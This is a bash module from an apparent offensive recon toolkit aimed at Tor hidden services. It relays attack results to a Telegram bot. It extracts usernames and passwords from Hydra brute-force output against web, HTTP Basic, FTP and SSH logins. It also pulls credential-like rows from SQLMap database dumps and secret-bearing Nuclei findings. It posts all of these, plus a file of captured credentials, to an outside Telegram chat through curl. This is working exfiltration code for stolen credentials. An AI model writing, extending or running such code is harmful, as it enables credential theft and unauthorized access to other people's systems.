#!/bin/bash

###############################################################################################################
# Telegram Notification Module for Hidden Services Edition
# Sends credentials and findings to Telegram
###############################################################################################################

# Send message to Telegram
function send_telegram_message() {
    local message="$1"
    local parse_mode="${2:-Markdown}"
    
    if [[ -z "$TELEGRAM_BOT_TOKEN" ]] || [[ -z "$TELEGRAM_CHAT_ID" ]]; then
        printf "%b[!] Telegram credentials not configured%b\n" "$yellow" "$reset"
        return 1
    fi
    
    local api_url="https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage"
    
    # Use curl to send message
    local response=$(curl -s -X POST "$api_url" \
        -d chat_id="$TELEGRAM_CHAT_ID" \
        -d text="$message" \
        -d parse_mode="$parse_mode" \
        2>/dev/null)
    
    if echo "$response" | grep -q '"ok":true'; then
        printf "%b[✓] Telegram notification sent%b\n" "$bgreen" "$reset"
        return 0
    else
        printf "%b[!] Failed to send Telegram notification%b\n" "$bred" "$reset"
        return 1
    fi
}

# Send file to Telegram
function send_telegram_file() {
    local file_path="$1"
    local caption="$2"
    
    if [[ -z "$TELEGRAM_BOT_TOKEN" ]] || [[ -z "$TELEGRAM_CHAT_ID" ]]; then
        printf "%b[!] Telegram credentials not configured%b\n" "$yellow" "$reset"
        return 1
    fi
    
    if [[ ! -f "$file_path" ]]; then
        printf "%b[!] File not found: %s%b\n" "$yellow" "$file_path" "$reset"
        return 1
    fi
    
    local api_url="https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument"
    
    curl -s -X POST "$api_url" \
        -F chat_id="$TELEGRAM_CHAT_ID" \
        -F document=@"$file_path" \
        -F caption="$caption" \
        >/dev/null 2>&1
    
    if [[ $? -eq 0 ]]; then
        printf "%b[✓] File sent to Telegram: %s%b\n" "$bgreen" "$(basename "$file_path")" "$reset"
        return 0
    else
        printf "%b[!] Failed to send file to Telegram%b\n" "$bred" "$reset"
        return 1
    fi
}

# Report credentials to Telegram
function report_credentials_telegram() {
    local service="$1"
    local username="$2"
    local password="$3"
    local hidden_service="$4"
    local additional_info="$5"
    
    if [[ "$TELEGRAM_ENABLED" != true ]]; then
        return 0
    fi
    
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    
    # Format message
    local message="🔐 *Credentials Found*

📍 *Hidden Service:* \`${hidden_service}\`
🔧 *Service:* ${service}
👤 *Username:* \`${username}\`
🔑 *Password:* \`${password}\`
📅 *Time:* ${timestamp}"

    if [[ -n "$additional_info" ]]; then
        message="${message}

ℹ️ *Additional Info:*
${additional_info}"
    fi
    
    message="${message}

---
🎯 reconFTW Hidden Services Edition"
    
    send_telegram_message "$message"
    
    # Also log to credentials file
    local creds_file="${output_dir}/credentials_found.txt"
    cat >> "$creds_file" << EOF
[${timestamp}] ${hidden_service}
Service: ${service}
Username: ${username}
Password: ${password}
Additional Info: ${additional_info}
---
EOF
}

# Parse and report brute force results
function parse_brute_results() {
    local hidden_service="$1"
    local brute_dir="${output_dir}/brute"
    
    if [[ ! -d "$brute_dir" ]]; then
        return 0
    fi
    
    printf "%b[*] Parsing brute force results for Telegram notification...%b\n" "$bblue" "$reset"
    
    # Parse web login results
    if [[ -f "$brute_dir/web_login.txt" ]]; then
        grep -i "password:" "$brute_dir/web_login.txt" | while read -r line; do
            # Extract username and password from hydra output
            # Format: [port][protocol] host: IP login: USER password: PASS
            if echo "$line" | grep -qE "login:|password:"; then
                local username=$(echo "$line" | sed -n 's/.*login: \([^ ]*\).*/\1/p')
                local password=$(echo "$line" | sed -n 's/.*password: \([^ ]*\).*/\1/p')
                
                if [[ -n "$username" ]] && [[ -n "$password" ]]; then
                    report_credentials_telegram "Web Login" "$username" "$password" "$hidden_service" "Found via brute force attack"
                fi
            fi
        done
    fi
    
    # Parse HTTP Basic Auth results
    if [[ -f "$brute_dir/http_basic.txt" ]]; then
        grep -i "password:" "$brute_dir/http_basic.txt" | while read -r line; do
            local username=$(echo "$line" | sed -n 's/.*login: \([^ ]*\).*/\1/p')
            local password=$(echo "$line" | sed -n 's/.*password: \([^ ]*\).*/\1/p')
            
            if [[ -n "$username" ]] && [[ -n "$password" ]]; then
                report_credentials_telegram "HTTP Basic Auth" "$username" "$password" "$hidden_service" "Found via brute force attack"
            fi
        done
    fi
    
    # Parse FTP results
    if [[ -f "$brute_dir/ftp.txt" ]]; then
        grep -i "password:" "$brute_dir/ftp.txt" | while read -r line; do
            local username=$(echo "$line" | sed -n 's/.*login: \([^ ]*\).*/\1/p')
            local password=$(echo "$line" | sed -n 's/.*password: \([^ ]*\).*/\1/p')
            
            if [[ -n "$username" ]] && [[ -n "$password" ]]; then
                report_credentials_telegram "FTP" "$username" "$password" "$hidden_service" "Found via brute force attack"
            fi
        done
    fi
    
    # Parse SSH results
    if [[ -f "$brute_dir/ssh.txt" ]]; then
        grep -i "password:" "$brute_dir/ssh.txt" | while read -r line; do
            local username=$(echo "$line" | sed -n 's/.*login: \([^ ]*\).*/\1/p')
            local password=$(echo "$line" | sed -n 's/.*password: \([^ ]*\).*/\1/p')
            
            if [[ -n "$username" ]] && [[ -n "$password" ]]; then
                report_credentials_telegram "SSH" "$username" "$password" "$hidden_service" "Found via brute force attack"
            fi
        done
    fi
}

# Parse and report SQLMap results
function parse_sqli_results() {
    local hidden_service="$1"
    local sqli_dir="${output_dir}/sqli"
    
    if [[ ! -d "$sqli_dir" ]]; then
        return 0
    fi
    
    printf "%b[*] Parsing SQL injection results for Telegram notification...%b\n" "$bblue" "$reset"
    
    # Look for database dumps or credentials
    find "$sqli_dir" -type f -name "*.csv" -o -name "*.txt" | while read -r file; do
        if grep -qiE "username|user|login|password|pass|email" "$file" 2>/dev/null; then
            # Extract potential credentials
            grep -iE "username|user|login|password|pass|email" "$file" | head -10 | while read -r line; do
                # Send as additional finding
                local message="💉 *SQL Injection Finding*

📍 *Hidden Service:* \`${hidden_service}\`
📄 *File:* $(basename "$file")
📝 *Data:* \`${line}\`
📅 *Time:* $(date '+%Y-%m-%d %H:%M:%S')

---
🎯 reconFTW Hidden Services Edition"
                
                send_telegram_message "$message"
            done
        fi
    done
}

# Parse Nuclei results for sensitive data
function parse_nuclei_results() {
    local hidden_service="$1"
    local nuclei_file="${output_dir}/nuclei/results.txt"
    
    if [[ ! -f "$nuclei_file" ]]; then
        return 0
    fi
    
    printf "%b[*] Parsing Nuclei results for sensitive findings...%b\n" "$bblue" "$reset"
    
    # Look for high/critical findings
    grep -iE "critical|high|password|credential|token|api[_-]?key|secret" "$nuclei_file" | head -20 | while read -r line; do
        if [[ -n "$line" ]]; then
            local message="🔍 *Vulnerability/Exposure Found*

📍 *Hidden Service:* \`${hidden_service}\`
🔎 *Finding:* ${line}
📅 *Time:* $(date '+%Y-%m-%d %H:%M:%S')

---
🎯 reconFTW Hidden Services Edition"
            
            send_telegram_message "$message"
        fi
    done
}

# Send scan start notification
function notify_scan_start() {
    local hidden_service="$1"
    
    if [[ "$TELEGRAM_ENABLED" != true ]]; then
        return 0
    fi
    
    local message="🚀 *Scan Started*

📍 *Target:* \`${hidden_service}\`
📅 *Time:* $(date '+%Y-%m-%d %H:%M:%S')
🔧 *Mode:* Hidden Services Edition

Starting reconnaissance...

---
🎯 reconFTW Hidden Services Edition"
    
    send_telegram_message "$message"
}

# Send scan completion notification
function notify_scan_complete() {
    local hidden_service="$1"
    local duration="$2"
    
    if [[ "$TELEGRAM_ENABLED" != true ]]; then
        return 0
    fi
    
    local message="✅ *Scan Completed*

📍 *Target:* \`${hidden_service}\`
⏱️ *Duration:* ${duration}
📅 *Time:* $(date '+%Y-%m-%d %H:%M:%S')
📂 *Output:* \`${output_dir}\`

Scan finished successfully.

---
🎯 reconFTW Hidden Services Edition"
    
    send_telegram_message "$message"
    
    # Send credentials summary if any found
    local creds_file="${output_dir}/credentials_found.txt"
    if [[ -f "$creds_file" ]] && [[ -s "$creds_file" ]]; then
        send_telegram_file "$creds_file" "Credentials found during scan of ${hidden_service}"
    fi
}

# Send summary of all findings
function send_findings_summary() {
    local hidden_service="$1"
    
    if [[ "$TELEGRAM_ENABLED" != true ]]; then
        return 0
    fi
    
    local summary=""
    local count=0
    
    # Count credentials found
    if [[ -f "${output_dir}/credentials_found.txt" ]]; then
        count=$(grep -c "^---$" "${output_dir}/credentials_found.txt" 2>/dev/null || echo 0)
    fi
    
    # Count vulnerabilities
    local vuln_count=0
    if [[ -f "${output_dir}/nuclei/results.txt" ]]; then
        vuln_count=$(wc -l < "${output_dir}/nuclei/results.txt" 2>/dev/null || echo 0)
    fi
    
    # Count directories found
    local dir_count=0
    if [[ -f "${output_dir}/fuzz/directories.json" ]]; then
        dir_count=$(jq '.results | length' "${output_dir}/fuzz/directories.json" 2>/dev/null || echo 0)
    fi
    
    summary="📊 *Scan Summary*

📍 *Hidden Service:* \`${hidden_service}\`
📅 *Time:* $(date '+%Y-%m-%d %H:%M:%S')

📈 *Statistics:*
🔐 Credentials Found: ${count}
🚨 Vulnerabilities: ${vuln_count}
📁 Directories: ${dir_count}

---
🎯 reconFTW Hidden Services Edition"
    
    send_telegram_message "$summary"
}

# Export functions
export -f send_telegram_message
export -f send_telegram_file
export -f report_credentials_telegram
export -f parse_brute_results
export -f parse_sqli_results
export -f parse_nuclei_results
export -f notify_scan_start
export -f notify_scan_complete
export -f send_findings_summary
